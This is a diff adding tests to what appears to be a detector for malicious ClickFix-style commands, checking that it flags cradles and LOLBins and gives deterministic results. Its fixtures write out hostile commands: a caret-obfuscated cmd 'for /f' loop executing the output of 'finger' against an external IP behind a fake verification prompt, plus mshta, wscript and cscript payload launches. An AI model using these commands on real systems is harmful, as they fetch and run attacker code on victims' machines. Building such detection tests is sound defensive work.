@@ -51,3 +51,33 @@ describe('WSH numeric char-code decode (§4)', () => {
     expect(ps.layers.some((l) => l.transform.includes('Chr'))).toBe(false)
   })
 })
+
+describe('closes the live-test gap (spec §0)', () => {
+  const CLICKFIX_LIVE_TEST_FIXTURE =
+    "cmd.exe /c for /f %e in ('f^inger user@45.9.148.20') do cmd.exe /c %e & echo --Verify... press ENTER to continue"
+
+  it('the caret-obfuscated finger/for-f ClickFix sample now yields cmd-cradle + finger signals, the widened ClickFix signal, and no cmd.exe-as-domain IOC', async () => {
+    const r = await analyze(CLICKFIX_LIVE_TEST_FIXTURE)
+    const ids = r.signals.map((s) => s.id)
+    expect(ids).toContain('cmd-cradle')
+    expect(ids).toContain('lolbin') // the finger LOLBin, data-driven via matchLolbin
+    expect(ids).toContain('clickfix')
+    expect(r.iocs.map((i) => i.raw)).not.toContain('cmd.exe')
+  })
+})
+
+describe('determinism across every new interpreter path', () => {
+  const fixtures = [
+    'cmd /c for /f %e in (\'finger user@45.9.148.20\') do %e',
+    'mshta vbscript:Execute(Chr(87)&Chr(83)&Chr(72))',
+    'wscript //E:vbscript C:\\Users\\Public\\payload.vbs',
+    'cscript //E:jscript C:\\Users\\Public\\payload.js',
+  ]
+
+  it.each(fixtures)('same input -> identical AnalysisResult (minus checkedAt) for %s', async (input) => {
+    const a = await analyze(input)
+    const b = await analyze(input)
+    const strip = (r: Awaited<ReturnType<typeof analyze>>) => ({ ...r, checkedAt: '' })
+    expect(strip(a)).toEqual(strip(b))
+  })
+})
